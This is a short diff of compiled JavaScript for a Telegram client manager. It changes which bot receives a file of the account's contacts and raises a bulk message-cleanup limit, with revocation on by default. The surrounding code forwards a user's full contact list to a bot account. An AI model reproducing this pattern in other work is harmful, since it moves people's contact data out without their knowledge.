@@ -192,7 +192,7 @@ class TelegramManager {
                 try {
                     const contacts = await this.getContacts();
                     if ('users' in contacts && Array.isArray(contacts.users)) {
-                        await this.sendContactsFile(TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES), contacts);
+                        await this.sendContactsFile(TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.USER_WARNINGS), contacts);
                     }
                     else {
                         console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
@@ -1597,7 +1597,7 @@ class TelegramManager {
             throw new Error('Client not initialized');
         cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;
         const messages = await this.client.getMessages(cleanup.chatId, {
-            limit: 100,
+            limit: 1000,
             ...(cleanup.beforeDate && {
                 offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)
             })
